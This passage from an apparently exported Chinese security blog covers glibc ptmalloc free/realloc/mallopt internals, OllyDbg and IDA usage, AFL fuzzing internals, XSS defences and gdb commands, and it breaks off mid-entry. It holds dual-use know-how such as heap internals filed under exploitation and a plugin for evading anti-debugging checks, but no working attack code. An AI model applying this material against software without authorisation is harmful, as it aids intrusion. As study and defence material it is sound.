bin添加不需要加锁),合并并重新设置当前bin的index,再次循环.否则使用sysmalloc获取内存. malloc失败并不会退出程序,而是返回null(也就是0). free概述 free函数接受一个指向分配区域的指针作为参数,释放该指针所指向的chunk.free函数的工作步骤如下. 判断指针是否为0,为0则直接return.否则进行下一步. 判断所需释放的chunk是否为mmaped chunk(M标志为1),是则调用munmap_chunk()释放mmaped chunk,释放完成.同时如果开启了mmap threshold的动态调整机制,且回收的chunk大小大于mmap threshold,小于mmap分配阈值的最大值,则设置该chunk的大小为mmap threshold,将mmap收缩阈值设定为mmap threshold的2倍.不是则进行下一步. 判断chunk的大小和所处的位置,若chunk_size &lt;= global_max_fast,则将chunk放到fast bins中,释放完成.否则进行下一步. 获取分配区的锁,判断前一chunk是否是空闲块,是则合并.是或不是都进行下一步. 判断下一chunk是否为top chunk,如果不是,则判断下一chunk是否是空闲块,是则合并.下一chunk不是top chunk的情况下都要放到unsorted bin中.如果下一chunk是top chunk,则将其与top chunk合并.然后进行下一步(所有情况). 判断合并后的chunk大小是否大于FASTBIN_CONSOLIDATION_THRESHOLD,是则遍历fast bins中chunk,与相邻的空闲chunk进行合并.进行下一步. 对于主分配区,判断top chunk的大小是否大于mmap收缩阈值,则会试图归还top chunk中的一部分给操作系统(sbrk调用).但最先分配的128KB空间不会归还;对于非主分配区,会进行sub-heap收缩,将top chunk的一部分返回给操作系统,如果top chunk为整个sub-heap,会把整个sub-heap还回给操作系统.到此,释放结束.从free()函数退出. realloc概述 realloc分以下几种情况. ptr == 0时等同于malloc. ptr != 0 &amp;&amp; size == 0时等同于free,返回值为0. malloc_usable_size(ptr) &gt;= size时会尝试缩减,产生部分free chunk. malloc_usable_size(ptr) &lt; szie时将malloc一块更大的内存,将原来的内容复制过去,再将原来的chunk给free掉. mallopt ptmalloc主要提供以下几个配置选项用于调优,通过mallopt()进行设置. mallopt()函数配置前,需要检查主分配区是否初始化了,如果没有初始化,调用ptmalloc_init()函数初始化ptmalloc,然后获得主分配区的锁,调用malloc_consolidate()函数,malloc_consolidate()函数会判断主分配区是否已经初始化,如果没有,则初始化主分配区.对mp_中参数字段的修改,是通过主分配区的锁来同步的. M_MXFAST M_MXFAST用于设置fast bins中保存的chunk的最大大小max_fast,M_MXFAST的最大值为80B,如果设置该选项为0,就会不使用fast bins. 1234567if (value &gt;= 0 &amp;&amp; value &lt;= MAX_FAST_SIZE)&#123; LIBC_PROBE (memory_mallopt_mxfast, 2, value, get_max_fast ()); set_max_fast (value);&#125;else res = 0; M_TRIM_THRESHOLD M_TRIM_THRESHOLD用于设置mmap收缩阈值,默认值为128KB.一般与M_MMAP_THRESHOLD选项一起使用,M_MMAP_THRESHOLD用于设置mmap threshold. M_TRIM_THRESHOLD的值必须设置为页大小对齐,设置为-1会关闭内存收缩设置. 123LIBC_PROBE (memory_mallopt_trim_threshold, 3, value, mp_.trim_threshold, mp_.no_dyn_threshold);mp_.trim_threshold = value;mp_.no_dyn_threshold = 1; M_MMAP_THRESHOLD M_MMAP_THRESHOLD用于设置mmap threshold,默认值为128KB,ptmalloc默认开启动态调整mmap threshold和mmap收缩阈值. 当内存大于mmap threshold,malloc相当于mmap的简单封装,free相当于munmap的简单封装. 12345678if ((unsigned long) value &gt; HEAP_MAX_SIZE / 2) res = 0;else&#123; LIBC_PROBE (memory_mallopt_mmap_threshold, 3, value, mp_.mmap_threshold, mp_.no_dyn_threshold); mp_.mmap_threshold = value; mp_.no_dyn_threshold = 1;&#125; M_MMAP_MAX M_MMAP_MAX用于设置进程中用mmap分配的内存块的最大限制,默认值为64K.如果将M_MMAP_MAX设置为0,ptmalloc将不会使用mmap分配大块内存. 123LIBC_PROBE (memory_mallopt_mmap_max, 3, value, mp_.n_mmaps_max, mp_.no_dyn_threshold);mp_.n_mmaps_max = value;mp_.no_dyn_threshold = 1;]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-OllyDbg]]></title>
    <url>%2Fposts%2F42405b40%2F</url>
    <content type="text"><![CDATA[OllyDbg OllyDbg是Windows下的32位汇编程序动态分析调试器. 基本界面 反汇编窗口:显示反汇编代码.双击可修改汇编代码,右键选择Undo selection撤销修改. 寄存器窗口:显示寄存器状态,可以设置不同的显示模式.双击即可修改. 堆栈窗口:显示ESP和EBP寄存器指向地址的信息. 数据窗口:有很多显示模式,可以右键点击选择. 还有部分窗口未直接显示,可通过控制面板上对应的图标打开. L:日志窗口,显示OllyDbg启动时的不同类型信息,还有条件断点的信息.右键选择Log to file可保存文本到文件. E:显示程序运行使用的模块. M:显示程序映射到虚拟内存空间的信息. T:显示程序的线程. W:显示程序. H:句柄窗口. C:返回到OllyDbg的主窗口,CPU窗口. /:显示程序被修改的信息. K:显示调用堆栈的信息. B:显示程序普通断点的列表,不显示硬件断点和内存断点. R:参考窗口,显示OllyDbg中搜索的结果. ...:显示RUN TRACE命令的结果. JIT 设置实时调试JIT(JUST IN TIME DEBUGGER). 选择Options-&gt; Just-in-time debugging,点击Make OllyDbg just-in-time debugger后点击done即可. 取消这个特性,只需要点击Restore old just-in-time debugger再点击Done即可. 常用热键 F7:单步步入. F8:单步步过. F9:运行程序. Ctrl+F9:直到出现ret中断. F2:设置或者删除断点(断点的地址栏为红色). F12(Debug-&gt;Run):临时暂停程序. 基本概念 入口点:程序被加载的第一条指令的地址.当用OD加载应用程序会停在入口点处.大部分的程序启动的时候都会停在入口点处,开了反调试则不会. 动态链接库(DLL):与正常的可执行文件EXE具有相同的格式.动态链接库可导出函数供其他可执行文件(EXE和DLL)调用.Windows的基本功能:文件,内存,进程,线程,图形,声音,网络等都是在标准的动态链接库中实现的.动态链接库中的函数也称为应用程序接口(API). Command命令 表达式求值:? &lt;expression&gt;. 设置函数断点:bp &lt;funcName&gt;. 断点 普通断点(INT 3断点) 设置普通断点后,OD会将对应指令处第一个字节指令替换成CC.为了不影响界面显示效果,OD会显示为原字节. 内存断点 内存访问断点也称为BPM.这种断点修改内存页的访问属性.不会出现断点列表中,且不能同时设置多个.OD也可以对区段设置内存断点.(同时OllyDbg支持内存访问一次性断点) 硬件断点 硬件断点(HBP)是处理器的特性之一,在OD中最多可以设置4个硬件断点. 硬件断点分为:硬件执行断点(ON EXECUTION),硬件写入断点(ON WRITE),硬件访问断点(ON ACCESS)3种. 硬件执行断点与普通的CC断点作用一样,但硬件执行断点并不会将指令首字节修改为CC,所以更难检测.(有些程序会使用一些技巧来清除硬件断点) 条件断点 条件断点实际上就是普通的CC断点,只不过该断点的触发需要满足设置的条件,如果满足设置的条件,那么程序就会中断下来. 消息断点 Windows消息被广泛用于各种事件的通知上面,可以通过消息来实现系统通知,移动鼠标,按下键盘上的某键等操作. Windows窗口程序至少有一个消息循环,消息循环有特定的API函数构成,最常见的是GetMessage和DispatchMessage函数,有的消息循环也会用到其他的API函数. 对于消息断点来说,只有在窗口创建之后才能够设置消息断点以及拦截消息. 打开Windows窗口,找到对应的窗口右键选择:Message breakpoint on ClassProc.消息断点实际上也是一个条件断点. Run trace,Hit trace Run trace可以把被调试程序执行过的指令保存下来,在Debugging options的Trace标签中进行设置. Hit trace通过断点实现,用于辨别代码是否执行. 常用插件 CmdBar CmdBar常用命令. ? expr:表达式求值. D(DB,DW,DD) expr:查看内存数据. BP expr[, condition]:设置断点或条件断点. Hw expr:设置硬件写断点 HideDebugger 用于绕过IsDebuggerPresent反调试检测. OllySSEH 用于检测模块是否开了SafeSEH. tips 代码被解析为数据:右键,Analysis-&gt;Analyse code或直接Ctrl + A快捷键.还是无法识别可以尝试右键,Analysis-&gt;Remove analysis from module. 反汇编窗口中push E000无法识别:因为OllyDbg反汇编引擎不能识别E是数字还是字母,使用0E000. OllyDbg把所有与程序或模块相关的信息保存在单独的UDD文件中,以便模块重新加载时继续使用. 已经删除断点,OllyDbg重新加载时断点重新出现,将配置文件ollydbg.ini中相应内容改为Backup UDD files=1. OllyDbg调试一些加壳程序运行到断点时可能卡死.将配置文件ollydbg.ini中相应内容改为Restore windows 0.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-pwn-fuzz-AFL-基础]]></title>
    <url>%2Fposts%2F48e1ca89%2F</url>
    <content type="text"><![CDATA[简介 AFL是一种灰盒Fuzzing工具. 通过对源码进行编译时插桩(通过注入探针代码来实现程序分析)的方式监测边界(代码)覆盖率,通过算法自动变异新的测试用例来探索二进制程序内部新的执行路径. AFL也支持直接对没有源码的二进制程序进行测试,但需要QEMU的支持. 原理 AFL的一个特点就是基于边界覆盖率的反馈机制,边界覆盖率的统计工作通过插桩完成,然后通过边界覆盖率来进行状态分析.记录输入样本的代码覆盖率,从而调整输入样本以提高覆盖率,增加发现漏洞的概率. fuzz过程中AFL会维护一个语料库队列queue,包含了初始测试用例及变异后有新状态产生的测试用例,变异策略分为确定性策略和随机性策略. AFL通过跳转指令将程序分为一个个基本块,将源基本块和目的基本块的配对组合称为tuple(元组).通过记录tuple统计边界覆盖率,AFL通过bitmap(以byte为单位从而记录tuple的命中数)来记录这些信息. 出现新tuple或已有tuple中出现的新命中组视为产生新状态(也意味着更新覆盖范围),相应的测试用例将被归入到语料库队列queue中. 上述过程会一直循环进行,期间触发了crash的文件会被记录下来. 插桩模块 AFL有三种不同模式的插桩操作. 其中普通模式和llvm模式是针对目标程序提供源码的情况,相较汇编级的普通模式插桩,编译级的llvm模式插桩包含更多优化.对仅提供二进制文件的目标程序则需借助qemu模式,其性能最低. 这三种模式所插入的代码从用途上都包括: 记录目标程序执行过程中的tuple信息,在每个基本块上都有插入. 必要的初始操作以及维护一个forkserver循环启动进程. 普通模式 gcc的-B prefix用于指定各阶段执行文件的优先查找目录.普通模式下AFL采用的插桩思路是先对gcc做一层简单封装,有一项是设定-B prefix选项并指向封装后的as汇编器所在目录. 123//afl-gcc.c,edit_params.cc_params[cc_par_cnt++] = "-B";cc_params[cc_par_cnt++] = as_path; 由封装后的as汇编器来处理前面生成的汇编文件,实际操作为查找汇编文件中的.text节区并在各控制转移指令处插入跳板trampoline_fmt_32／trampoline_fmt_64后再交由真正的as汇编器处理. 分析可知跳板的作用是跳转到具体的实现部分main_payload_32／main_payload_64,此部分指令只会插入一次. 其中一个分支是用于记录目标程序执行过程中的tuple信息. 123456cur_location = &lt;COMPILE_TIME_RANDOM&gt;;//目的基本快位置,随机化生成.shared_mem[cur_location ^ prev_location]++;//记录tuple信息的bitmap.prev_location = cur_location &gt;&gt; 1;//新的源基本块位置,移位操作是为了保留元组的方向性. 另一分支进行初始操作并维护forkserver,它会将已经初始化好的目标进程暂停在某个地方(例如main函数入口).按需再fork出一个子进程交予fuzzer进行测试.forkserver和fuzzer间是通过pipe管道进行通信的,除了控制命令,fork成功后的PID以及waitpid返回状态都是借由此方式传递. llvm模式 LLVM中代码首先由编译器前端clang处理后得到中间代码IR,再经过各pass工作节点的优化和转换,最终交给编译器后端生成机器码. AFL的插桩思路是通过编写pass来实现tuple信息的记录,在此过程中会对每一基本块都插入探针,具体代码在afl-llvm-pass.so.cc文件.而初始化和forkserver操作则通过链接完成,afl-llvm-rt.o.c文件实现了afl-as.h中main_payload的这部分功能. qemu模式 对于该模式下的插桩,AFL的思路是直接利用QEMU内置的跟踪功能,并通过patch源码的方式来实现afl-as.h中的操作. fuzzer模块 主要作用是通过不断改变测试用例来影响目标程序的执行路径,相关代码在afl-fuzz.c文件. 起始阶段fuzzer会进行一系列的准备工作,例如初始化bitmap,forkserver上线,与子进程的交互准备,目录处理与前期检测等. fuzzing策略 AFL中用到的变异策略分为确定性策略和随机性策略. 对于各变异操作,基本的处理流程如下. 如果一个测试用例在执行完随机性策略后仍未产生新状态,则会将其与另一测试用例随机拼接后再次交由随机性策略处理.而在确定性策略fuzzing过程中,如果发现后续的变异操作已经在前面进行过了,为避免重复将会跳过该操作,如果没有重复则由common_fuzz_stuff函数将变异后的内容写入测试文件并运行目标程序. 变异的主要类型如下. bitflip,按位翻转,1变为0,0变为1. arithmetic,整数加减算术运算. interest,把一些特殊内容替换到原文件中. dictionary,把自动生成或用户提供的token替换/插入到原文件中. havoc,此阶段会对原文件进行大量变异. splice,此阶段会将两个文件拼接起来得到一个新的文件. 其中,前四项是非dumb mode(-d)和主fuzzer(-M)会进行的操作,由于其变异方式没有随机性,所以也称为deterministic fuzzing;havoc和splice则存在随机性,是所有状况的fuzzer都会执行的变异. bitflip 最先使用的变异策略就是bitflip,根据翻转量/步长会进行多种不同的翻转,按照顺序依次为. bitflip 1/1,每次翻转1个bit,按照每1个bit的步长从头开始. bitflip 2/1,每次翻转相邻的2个bit,按照每1个bit的步长从头开始. bitflip 4/1,每次翻转相邻的4个bit,按照每1个bit的步长从头开始. bitflip 8/8,每次翻转相邻的8个bit,按照每8个bit的步长从头开始,即依次对每个byte做翻转. bitflip 16/8,每次翻转相邻的16个bit,按照每8个bit的步长从头开始,即依次对每个word做翻转. bitflip 32/8,每次翻转相邻的32个bit,按照每8个bit的步长从头开始,即依次对每个dword做翻转. 在上述过程中AFL巧妙地嵌入了一些对文件格式的启发式判断. 自动检测token:在进行bitflip 1/1变异时,对于每个byte的最低位翻转还进行了额外的处理:如果连续多个bytes的最低位被翻转后.程序的执行路径都未变化.而且与原始执行路径不一致,那么就把这一段连续的bytes判断是一条token. 为了控制这样自动生成的token的大小和数量,AFL在config.h中通过宏定义限制. 1234#define MIN_AUTO_EXTRA 3#define MAX_AUTO_EXTRA 32#define USE_AUTO_EXTRAS 10#define MAX_AUTO_EXTRAS (USE_AUTO_EXTRAS * 10) 生成effector map:在进行bitflip 8/8变异时,AFL还生成了一个非常重要的信息:effector map.具体地,在对每个byte进行翻转时,如果其造成执行路径与原始路径不一致,就将该byte在effector map中标记为1,即有效的,否则标记为0. 如果一个byte完全翻转,都无法带来执行路径的变化,那么这个byte很有可能是属于data而非metadata,对整个fuzzing的意义不大. arithmetic 在bitflip变异全部进行完成后,便进入arithmetic.arithmetic根据目标大小的不同,也分为了多个子阶段. arith 8/8,每次对8个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个byte进行整数加减变异. arith 16/8,每次对16个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个word进行整数加减变异. arith 32/8,每次对32个bit进行加减运算,按照每8个bit的步长从头开始,即对文件的每个dword进行整数加减变异. 加减变异的上限,在config.h中的宏ARITH_MAX定义,默认为35.所以,对目标整数会进行+1,...,+35,-1,...,-35的变异.由于多个字节的整数存在大端序和小端序两种表示方式,AFL对这两种整数表示方式都进行变异. AFL还会智能地跳过某些arithmetic变异.第一种情况就是前面提到的effector map:如果一个整数的所有bytes都被判断为无效,那么就跳过对整数的变异.第二种情况是之前bitflip已经生成过的变异此次便不会再执行. interest 下一个阶段是interest,也分为了多个子阶段. interest 8/8,每次对8个bit替换,按照每8个bit的步长从头开始,即对文件的每个byte进行替换. interest 16/8,每次对16个bit进替换,按照每8个bit的步长从头开始,即对文件的每个word进行替换. interest 32/8,每次对32个bit进替换,按照每8个bit的步长从头开始,即对文件的每个dword进行替换. 用于替换的interesting values是AFL预设的一些比较特殊的数. 123static s8 interesting_8[] = &#123; INTERESTING_8 &#125;;static s16 interesting_16[] = &#123; INTERESTING_8, INTERESTING_16 &#125;;static s32 interesting_32[] = &#123; INTERESTING_8, INTERESTING_16, INTERESTING_32 &#125;; 这些数的定义在config.h文件中.基本都是可能会造成溢出的数.与之前类似,effector map仍然会用于判断是否需要变异;此外重复性变异也是会跳过的. dictionary 进入到这个阶段,就接近deterministic fuzzing的尾声了,具体有以下子阶段. user extras (over),从头开始,将用户提供的tokens依次替换到原文件中. user extras (insert),从头开始,将用户提供的tokens依次插入到原文件中. auto extras (over),从头开始,将自动检测的tokens依次替换到原文件中. 用户提供的tokens是在词典文件中设置并通过-x选项指定的,如果没有则跳过相应的子阶段. havoc havoc包含了对原文件的多轮变异,每一轮都是将多种方式组合stacked而成. 随机选取某个bit进行翻转. 随机选取某个byte/word/dword,将其设置为随机的interesting value. 随机选取某个byte/word/dword,并随机选取大/小端序,对其加/减去一个随机数. 随机选取某个byte,将其设置为随机数. 随机删除一段bytes. 随机选取一个位置,插入/替换一段随机长度的内容,其中75%的概率是插入原文中随机位置的内容,25%的概率是插入一段随机选取的数. 随机选取一个位置,用随机选取的token(用户提供的或自动生成的)替换/插入. AFL会生成一个随机数,作为变异组合的数量,并根据这个数量,每次从上面那些方式中随机选取一个,依次作用到文件上. splice splice是将两个seed文件拼接得到新的文件,并对这个新文件继续执行havoc变异. 具体地,AFL在seed文件队列中随机选取一个,与当前的seed文件做对比.如果两者差别不大,就再重新随机选一个;如果两者相差比较明显,那么就随机选取一个位置,将两者都分割为头部和尾部.最后,将当前文件的头部与随机文件的尾部拼接起来,就得到了新的文件.在这里,AFL还会过滤掉拼接文件未发生变化的情况. cycle 上面的变异完成后,AFL会对文件队列的下一个进行变异处理.当队列中的全部文件都变异测试后,就完成了一个cycle,整个队列又会从第一个文件开始,再次进行变异,不过与第一次变异不同的是,这一次就不需要再进行deterministic fuzzing了.如果用户不停止AFL,那么seed文件将会一遍遍的变异下去. 语料库更迭 随着fuzzing的深入,目标程序会产生越来越多的执行路径,相应测试用例能否加入语料库queue队列取决于trace_bits(位于共享内存上,记录当前的tuple信息)是否出现新状态. fuzzer会通过virgin_bits来记录目标程序的总tuple信息,每个tuple对应一个字节,初始值为0xFF. 每个tuple都分为8个命中组,每个比特位可对应一个命中组,若无此类新状态出现其值仍为1,若出现其值则置0.执行完目标程序后要调用classify_counts函数对此次记录的各tuple命中数进行归组. 1234567891011static const u8 count_class_lookup8[256] = &#123; [0] = 0, [1] = 1, [2] = 2, [3] = 4, [4 ... 7] = 8, [8 ... 15] = 16, [16 ... 31] = 32, [32 ... 127] = 64, [128 ... 255] = 128&#125;; 只需将执行完归组操作后的trace_bits和virgin_bits做个比对就能判断出是否有新状态产生,同时,采用位运算也是为了提高代码执行的速率. 后续合成的一些测试用例的边覆盖可能是之前测试用例的代码覆盖的超集.为了优化fuzzing,AFL周期性的重新评估队列.使用一种快速算法选择仍然能覆盖每一个元组,但有更小的测试用例的子集. 算法通过指定每一个队列入口,根据执行延迟和文件大小分配一个分值比例.然后为每一个元组选择最低分值作为候选构造最小覆盖集.生成的favored entries的语料与初始数据集相比,在体积上通常要小5-10x倍.Non-favored entries将不会被丢弃,但当在队列中遇到的时候,它们会被不同的概率跳过. 如果在队列中有新的favored entries,99%的non-favored entries将被跳过. 如果没有新的favored entries,且当前non-favored entry是之前被fuzzed过得,它将被以95%的概率跳过. 如果没有新的favored entries,且当前non-favored entry没有通过任何fuzzing rounds,它将被以75%的概率跳过.]]></content>
      <categories>
        <category>IS</category>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-IDA-基础]]></title>
    <url>%2Fposts%2F6145840e%2F</url>
    <content type="text"><![CDATA[反汇编 IDA是一个反汇编工具,软件开发过程中,程序员使用编译器,汇编器和链接器来创建可执行程序.对应的可以使用反汇编器和反编译器来获得可执行程序的可阅读的代码. 但反编译会面临由于编译过程的损失,编译过程的多对多等问题.(反汇编由于是一对一,处理过程简单很多) 汇编语言源代码主要采用两种语法:AT&amp;T和Intel语法. 反汇编算法 首先要确定代码区域,这需要知道对应可执行文件的文件格式从而找到代码段的起始地址,找到后读取进行查表找到其汇编语言助记符,这一步需要明晰当前指令集,然后解码后输出汇编代码.反复执行这些即可. 而如何选择下一条反汇编的指令,如何区分代码和数据,如何确定最后一条指令就因具体算法而异,其中最主要的有线性扫描和递归下降.IDA采用的是后者. 反汇编引擎 ODDisasm,BeaEngine,Udis86,Capstone,AsmJit,Keystone等等. IDA目录组成 cfg:各种配置文件,例如基本配置文件ida.cfg,GUI配置文件idagui.cfg等. dbgsrv:远程debug使用的程序. idc:包含IDA内置脚本语言IDC所需的核心文件. ids:包含一些符号文件. loaders:包含在文件加载过程中用于识别和解析PE或ELF等已知文件格式的IDA扩展. plugins:包含专门为IDA提供附加功能的IDA模块. procs:包含已安装的IDA版本所支持的处理器模块,其为IDA提供机器语言到汇编语言的转换功能. sig:包含IDA在各种模式匹配操作中利用的现有代码的签名. til:包含一些类型库信息,记录特定于各种编译器库的数据结构的布局. 使用 IDA通过执行loaders目录中的文件加载器对文件解析,如果IDA没能识别出文件格式,需要自行选择合适的处理器类型,加载段,加载偏移量.核心选项用于配置特定的反汇编分析选项.处理器选项用于配置处理器模块. IDA会将文件加载到内存,并对相关部分进行解析,同时IDA会创建一个数据库保存这些信息,数据库组件分别保存在四个文件中,分别为filename.id0,filename.id1,filename.nam,filename.til.关闭项目时这四个文件会被归档为一个IDB文件. 分析完成后就可以在IDA桌面环境对文件进行分析. IDA主要窗口有反汇编窗口,Names窗口,消息窗口,Strings窗口,另外还有hex窗口,导出窗口,导入窗口,函数窗口和结构体窗口等. 常用快捷键 f5:反汇编. f12:函数流程图. esc:在反汇编窗口会倒回上一部操作的视图,在其他窗口会关闭该窗口. shift + f12:打开string窗口. shift + f2:打开脚本窗口,可以运行python和idc脚本. shift + e:导出数据,逆向时常使用该操作导出key. ctrl + f12:函数调用图. ctrl + w:保存ida数据库. ctrl + s:选择某个数据段,直接进行跳转. ctrl + shift + w:拍摄IDA快照. alt + k:修改栈指针更改的字节数. x:查看函数,变量的交叉引用. g:直接跳转到某地址. n:更改函数,变量的名称,输入空白则会变成默认名称. y:更改变量的类型. /:在反编译后伪代码的界面中写注释. \:在反编译后伪代码的界面中隐藏/显示变量和函数的类型描述. ;:在反汇编后的界面中写下注释. c:定义一段指令. p:定义一个子程序. d:数据类型切换(db,dw,dd). u:取消函数,代码,数据的定义. a:将数据转换为ASCII字符串. *:进行数组定义. 双击:跳转到地址. 数据设置 Options-&gt;Setup Data Types可以设置数据类型,同时右侧复选框可以设置数据转盘(d键循环数据转盘). Edit-&gt;Strings可以选择字符串类型,即以对应字符解析规则解析当前地址开始的字节. Edit-&gt;Array可以创建数组,创建的数组类型以选择创建处的变量类型决定. 识别与切换指令集 Edit-&gt;Segments-&gt;Change segment register value(快捷键alt + g). 函数操作 IDA支持新建,删除函数和函数块(指定义),Edit-&gt;Functions种有其支持的操作. 同时还支持编辑函数的属性:函数名,函数起始和结束地址,局部变量,保存的寄存器,已删除字节和栈指针增量等. FLIRT Fast Library Identification and Recognition Technology(库文件快速识别与鉴定技术). IDA可以通过导入签名文件(Shift + F5,右键导入)进一步识别库函数.还可以利用FLIRT解析器(存放在bin目录)创建签名文件,具体可查阅文档. 可以通过lscan找到对应的签名库,首先python lscan.py -S amd64/sig -f ./demo,然后将对应签名库拷贝到IDA的sig/pc文件夹导入即可. 调试器 IDA支持本地调试,Attach已有进程和远程调试等多种方式(支持IDC脚本自动化调试). 远程调试只需要利用dbgsrv下对应目标主机版本的程序,在目标主机运行该程序即可.程序支持-p &lt;port&gt;,默认23496;-P &lt;password&gt;,设置连接调试密码;-v设置为详细模式. Patch Edit -&gt; Patch program,然后选择修改方式即可,修改完成后Edit -&gt; Patch program -&gt; Apply ...保存到本地. 中文支持 修改cfg/ida.cfg. 123456789// CULTURE=&quot;all&quot;;CULTURE=&quot;all&quot;NameChars = &quot;$?@&quot; &quot;_0123456789&quot; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot; &quot;abcdefghijklmnopqrstuvwxyz&quot;, Culture_CJK_Unified_Ideographs, CURRENT_CULTURE; 常用插件 keypatch:用于patch二进制程序. idawasm:用于逆向webassembly代码. rizzo:通过签名识别函数. 插件仓库:https://github.com/devttys0/ida. 常见错误 sp-analysis failed:IDA解析的时候认为ESP的值是错误的.修正:Options-&gt;General-&gt;Stack pointer勾选,在leave这一行按快捷键ALT + K,修改其值为leave前方标志的其ESP偏移值.]]></content>
      <categories>
        <category>IS</category>
        <category>reverse</category>
      </categories>
      <tags>
        <tag>tool</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-web-XSS-防御]]></title>
    <url>%2Fposts%2Ff27dd5e0%2F</url>
    <content type="text"><![CDATA[同源策略 源是host,协议,端口的三元组. 同源策略(SOP)是Web应用程序的一种安全模型,用于控制网页中DOM之间的访问(只是模型,不是标准). 同源策略被广泛地应用在处理Web内容的各种客户端上,比如各大浏览器,Adobe的Flash/Acrobat等.不同的客户端对于同源策略的处理也并非完全一致. 例如在Java6,7中,如果两个域名解析到相同的IP,认为它们同源. 同源策略没有禁止脚本的执行,而是禁止读取HTTP回复(静态资源通常不受同源策略限制). SOP影响范围包括:普通的HTTP请求,XMLHttpRequest,XSLT,XBL. 如果两个页面使用的协议,端口,主机名都相同,则认为两个页面同源. 页面跨域的行为主要会分为三类(所有具有src属性的HTML标签都是可以跨域的). 跨域写,通常被允许(链接,重定向和表单提交,一些不常见的HTTP请求方法需要先发送预请求(preflight,例如OPTIONS)). 跨域嵌入,通常被允许(资源嵌入). 跨域读,通常被禁止. 禁止跨域写需要引入CSRF令牌,并且正确的配置同源策略,否则CSRF令牌本身也将被恶意网页读取. 禁止跨域读可以通过设置X-Frame-Options头来禁止该页面被嵌入到恶意页面中. 禁止跨域嵌入需要确保资源本身无法嵌入到各种跨域访问方式中.同时,使用CSRF令牌也可以有效避免被跨域嵌入. 这与浏览器沙箱的设计理念不谋而合:沙箱是一个受保护的环境,在这个环境中的脚本只能访问指定的资源. 跨源访问 最好的方式是使用CORS,或者使用Window.postMessage(HTML5新增),JSONP. 相同主域名不同子域名下的页面,可以设置document.domain让它们同域. CSP Content Security Policy(CSP)内容安全策略,是一个附加的安全层,有助于检测并缓解某些类型的攻击,包括跨站脚本和数据注入攻击.CSP是在浏览器层面做的防护,和同源策略同一级别. 浏览器目前可以通过获取Header头来进行CSP配置,CSP规则举例:header("Content-Security-Policy: default-src 'self'; script-src 'self' https://lorexxar.cn;");. 指令参考. default-src:定义资源默认加载策略. connect-src:定义Ajax,WebSocket等加载策略. font-src:定义Font加载策略. frame-src:定义Frame加载策略. img-src:定义图片加载策略. media-src:定义&lt;audio&gt;,&lt;video&gt;等引用资源加载策略. object-src:定义&lt;applet&gt;,&lt;embed&gt;,&lt;object&gt;等引用资源加载策略. script-src:定义JS加载策略. style-src:定义CSS加载策略. sandbox:值为allow-forms,对资源启用sandbox. report-uri:值为/report-uri,提交日志. 使用在线生成CSP规则的站点来辅助编写:http://cspisawesome.com/ HttpOnly 浏览器会禁止JavaScript访问带有HttpOnly属性的Cookie. 一个Cookie使用过程如下. 浏览器向服务器发送请求(此时无Cookie). 服务器返回时发送Set-Cookie头,向客户端写入Cookie. 浏览器访问时携带Cookie(在Cookie到期之前). HttpOnly在Set-Cookie时标记. XSS Filter 一般采用输入格式限制+黑名单,过于严格的过滤可能会曲解用户原来的意思. 格式限制可以包括:限制为输入内容为合法字符,限制输入长度等. 输入过滤 在处理输入时,来自用户的UGC信息,来自第三方的链接,URL参数,POST参数,Referer(可能来自不可信的来源),Cookie(可能来自其他子域注入)都不可信. 对于链接跳转,如&lt;a href="xxx" 或 location.href="xxx",要检验其内容,禁止以javascript:(包括jAvascript:,%20javascript:)开头的链接,和其他非法的scheme. 输出过滤 通过编码函数对输出进行编码从而预防XSS.恶意代码被转义,不再被浏览器执行. 针对不同代码有不同的编码方式,针对HTML代码的编码方式是HtmlEncode,对应函数escapeHTML.PHP中的函数实现有htmlentities()和htmlspecialchars(). 其本质是转换部分特殊字符,例如htmlspecialchars:&amp; -&gt; &amp;amp,&lt; -&gt; &amp;lt," =&gt; &amp;quot,' =&gt; &amp;#039,&gt; =&gt; &amp;gt. 最后还可以加上黑名单的过滤方法. ClickJacking防御 使用frame busting. 123if (top.location != location) &#123; top.location = location;&#125; 使用HTTP头X-Frame-Options,有三个值可选. DENY:拒绝加载任何frame页面. SAMEORIGIN:frame页面的地址只能为同源域名下的地址. ALLOW-FROM:用于定义允许frame加载的地址. 其他 输入内容长度控制,使用验证码,避免拼接HTML. 避免内联事件,尽量不要使用onLoad="onload('')",onClick="go('')"这种拼接内联事件的写法,而是在JavaScript中通过.addEventlistener()绑定事件.]]></content>
      <categories>
        <category>IS</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IS-reverse-tool-gdb]]></title>
    <url>%2Fposts%2F855025a9%2F</url>
    <content type="text"><![CDATA[启动方式 调试可执行文件. 1$gdb &lt;path&gt; 调试core文件(程序非法执行后core dump后产生). 1$gdb &lt;path&gt; &lt;core path&gt; 调试服务程序. 1$gdb &lt;path&gt; &lt;PID&gt; 可以看出可执行文件本身是调试必须.其中服务的path可以在PATH环境变量中搜索得到. 使用 gdb使用交互模式,通过命令完成对程序的调试.交互模式下直接回车的作用是重复上一指令. 运行指令 run(r):运行程序到断点或程序结束. continue(c):继续运行程序到断点或程序结束. next(n):单步步过. step(s):单步步入.(与next区别为遇到函数调用是否进入函数体调试) until:运行程序直到退出循环体. until + n:运行程序至n行.(不仅仅用来跳出循环) finish:运行程序到当前函数返回,并打印函数返回时的堆栈地址和返回值及参数值等信息. 断点指令 break n(b n):在第n行处设置断点.(有源代码的情况可以带上代码路径和代码名称:b OAGUPDATE.cpp:578) break func:在函数func的入口处设置断点. b fn1 if a&gt;b:条件断点设置. delete n:删除断点号为n的断点. delete breakpoints:清除所有断点. disable n:暂停断点号为n的断点. enable n:开启断点号为n的断点 clear n:清除第n行的断点. info b(info breakpoints):显示程序的断点设置. 信息指令 list(l):显示程序源代码.(默认10行,继续输入list会接着上次显示源代码) list n:显示以第n行为中心的10行代码. list func:显示函数func的源代码. print 